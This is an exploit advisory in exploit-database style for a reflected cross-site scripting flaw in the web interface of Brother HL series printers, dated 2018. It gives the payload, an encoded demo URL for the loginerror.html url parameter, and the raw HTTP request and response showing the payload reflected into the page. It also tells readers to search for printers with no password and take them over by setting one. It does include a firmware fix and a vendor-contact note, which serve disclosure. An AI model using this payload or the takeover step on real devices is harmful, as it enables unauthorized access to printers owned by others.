# Exploit Title: [ XSS at Brother HL series printers]

 
# Date: [30.05.2018]
 
# Exploit Author: [Huy Kha]

# Vendor Homepage: [http://support.brother.com]
 
# Software Link: [ Website ]
 
# Version: Brother HL series printers.

# Tested on: Mozilla FireFox 
 
# Reflected XSS Payload :

"--!><Svg/OnLoad=(confirm)(1)>"

# Description : Starting searching for printers without having a password. 
When you see a yellow bar with ''Configure the password'' you can take over the full printer by putting a password on it.


# PoC :
If you want to execute the XSS you need to be loged into the web interface first. 

# Example :

1. Go to the following url: http://127.0.0.1/
2. Login with ''admin'' as password
3. Intercept now the request with Burpsuite
4. The XSS exist in the loginerror.html?url= parameter

4. Demo URL: http://127.0.0.1/etc/loginerror.html?url=%2Fnet%2Fnet%2Fservice_detail.html%3Fservice%3D%2522--!%253E%253CSvg%2FOnLoad%3D(confirm)(1)%253E%2522%26pageid%3D241


# Request :

GET /etc/loginerror.html?url=%2Fnet%2Fnet%2Fservice_detail.html%3Fservice%3D%2522--!%253E%253CSvg%2FOnLoad%3D(confirm)(1)%253E%2522%26pageid%3D241 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: nl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0


# Response :

HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Length: 3389
Content-Type: text/html
Content-Language: nl
Connection: close
Server: debut/1.20
Pragma: no-cache

<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html lang="nl" xmlns="http://www.w3.org/1999/xhtml" xml:lang="nl"><head><meta http-equiv="Content-Script-Type" content="text/javascript" /><meta http-equiv="content-style-type" content="text/css" /><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /><script type="text/javascript" src="/common/js/ews.js"></script>
 <link rel="stylesheet" type="text/css" href="../common/css/common.css" /> 
 <link rel="stylesheet" type="text/css" href="../common/css/ews.css" /><title>Brother HL-L2340D series</title></head><body><div id="baseFrame"><div id="frameContainer"><div id="headerFrameContainerLeft"><div id="headerFrameContainerRight"><div id="headerFrameInner"><div id="headerFrame"><div id="modelName"><h1>HL-L2340D series</h1><div class="SetBox" id="SetBoxAuthRight"><div id="SetBoxAuthLeft"><form method="post" action="/general/status.html"><div>Log&#32;in<input type="password" id="LogBox" name="B1d6" /><input type="hidden" name="loginurl" value="/net/net/service_detail.html?service="--!><Svg/OnLoad=(confirm)(1)>"&pageid=241"/><input id="login" type="submit" value="&nbsp;" /></div></form></div></div></div><div id="corporateLogo"><img src="/common/images/logo.gif" alt="Brother" /></div></div><div id="solutions"><div><span><a href="http://solutions.brother.com/cgi-bin/solutions.cgi?MDL=prn088&LNG=en&SRC=DEVICE">Brother<br />Solutions&#32;Center</a></span></div></div><div id="tabMenu"><ul><li><ul><li class="selected"><p>Algemeen</p></li></ul></li></ul></div></div></div></div><div id="mainFrameContainer"><div id="mainFrameTopLeft"><div id="mainFrameTopRight"><div id="mainFrameTopInner"><div id="subTabMenu">&nbsp;</div></div></div></div><div id="mainFrameInner"><div id="subMenu"><div><a href="/general/status.html">Status</a></div><div><a href="/general/reflesh.html" class="subPage">Interval&#32;voor&#32;autom.&#32;vernieuwen</a></div><div><a href="/general/information.html?kind=item">Onderhoudsinformatie</a></div><div><a href="/general/lists.html">Lijsten/Rapporten</a></div><div><a href="/general/find.html">Apparaat&#32;zoeken</a></div><div><a href="/general/contact.html">Contactpersoon&#32;&&#32;locatie</a></div><div><a href="/general/sleep.html">Slaapstand</a></div><div><a href="/general/powerdown.html">Automatisch&#32;uitschakelen</a></div><div><a href="/general/language.html">Taal</a></div><div><a href="/general/panel.html">Paneel</a></div><div><a href="/general/replacetoner.html">Toner&#32;vervangen</a></div></div><div id="rightFrameContainer"><div id="rightFrame"><div id="mainContent"><div id="pageTitle"><h2>Log&#32;in</h2></div><div id="pageContents"><div class="contentsGroup"><p class="noteMessage">Om&#32;deze&#32;pagina&#32;te&#32;openen&#32;moet&#32;u&#32;inloggen.&#32;Log&#32;in&#32;s.v.p.</p></div></div></div></div></div><script type="text/javascript"><!--
SetMinHeight();
// --></script></div><div id="mainFrameBottomLeft"><div id="mainFrameBottomRight"><div id="mainFrameBottomInner"></div></div></div></div><div id="footerFrameContainer"><div id="copyright">Copyright(C) 2000-2014 Brother Industries, Ltd. All Rights Reserved.</div><div id="topBack"><a href="#">Top<img src="/common/images/ic_pt.gif" alt="Top" /></a></div></div></div></div></body></html>



# How to fix it? : Update the printer to Firmware 1.16 and set a new password.

# Screenshot : https://imgur.com/a/3OVTSZ4


# Note: The vendor has been contacted on 30-5-2018.